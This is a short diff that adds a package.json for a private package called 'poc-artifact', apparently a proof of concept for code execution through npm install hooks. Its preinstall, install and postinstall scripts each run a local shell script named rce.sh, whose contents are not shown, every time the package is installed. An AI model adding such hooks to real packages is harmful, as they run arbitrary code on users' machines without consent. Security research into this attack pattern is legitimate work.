@@ -1,0 +1,10 @@
+{
+  "name": "poc-artifact",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "sh -c 'sh ./rce.sh'",
+    "install": "sh -c 'sh ./rce.sh'",
+    "postinstall": "sh -c 'sh ./rce.sh'"
+  }
+}
